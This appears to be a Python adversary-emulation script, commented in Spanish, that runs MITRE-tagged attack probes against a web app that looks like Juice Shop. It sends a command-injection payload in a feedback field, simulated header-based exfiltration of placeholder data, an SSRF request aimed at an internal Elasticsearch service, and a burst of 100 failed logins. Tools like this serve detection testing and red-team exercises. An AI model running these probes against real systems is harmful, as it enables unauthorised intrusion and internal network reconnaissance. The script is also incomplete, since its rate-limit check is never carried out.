import requests
import base64

def run_ttp_module(target_url):
    print("[*] Ejecutando Emulación TTP...")
    
    # T1059: Command Injection concatenado
    rce_payload = {"comment": "test_feedback && whoami &&", "rating": 5}
    try:
        requests.post(f"{target_url}/api/Feedbacks", json=rce_payload)
    except: pass

    # T1041: Exfiltration over Web Service
    # Simulación de robo de datos mediante cabeceras HTTP anómalas
    exfil_header = {"X-Company-Debug": base64.b64encode(b"CONFIDENTIAL_DATA").decode()}
    requests.get(target_url, headers=exfil_header)

    internal_service = "http://elasticsearch:9200/_cat/indices"
    ssrf_payload = {"imageUrl": internal_service}
    try:
        response = requests.post(f"{target_url}/api/Profile/Image", json=ssrf_payload)
        # Validación: Si la respuesta web contiene datos de Elastic, hay puente de red
        if "yellow open" in response.text:
            print("[!] SSRF Exitoso.")
    except: pass

    login_url = f"{target_url}/rest/user/login"
    rate_limit_detected = False
    
    for i in range(100):
        try:
            requests.post(login_url, json={"email": f"user{i}", "password": "wrong"})
            # En un entorno real checking response.status_code == 429
        except: pass